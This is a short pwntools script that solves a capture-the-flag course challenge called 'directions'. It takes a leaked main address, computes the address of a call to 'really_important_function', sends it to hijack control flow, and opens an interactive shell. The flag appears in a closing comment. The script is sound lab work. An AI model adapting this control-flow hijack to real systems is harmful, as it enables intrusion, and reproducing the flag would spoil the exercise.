from pwn import *

# context.log_level = "DEBUG"

CHALLENGE = "directions"
URL = "offsec-chalbroker.osiris.cyber.nyu.edu"
PORT = 1244
NETID = b"xz4344"
LOCAL = False

if LOCAL:
    p = process(CHALLENGE)
else:
    p = remote(URL, PORT)
    p.recvuntil(b"NetID (something like abc123): ")
    p.sendline(NETID)

print(p.recvuntil(b": ").decode())
main_addr = p.recv(8)
log.info(f"Receiving address in raw bytes: {main_addr}")
print(p.recvuntil(b"> ").decode())
main_addr = u64(main_addr)
main_offset = 0x1223
really_important_function_CALL_offset = 0x1245
really_important_function_CALL_addr = main_addr - main_offset + really_important_function_CALL_offset
p.sendline(p64(really_important_function_CALL_addr))
log.info(f"Sending address in raw bytes: {p64(really_important_function_CALL_addr)}")

p.interactive()

# flag{st4t1c_4n4lys1s_g1v3s_us_s0_much_1nf0_4b0ut_4_b1n4ry!_33af9f51381f50c1}
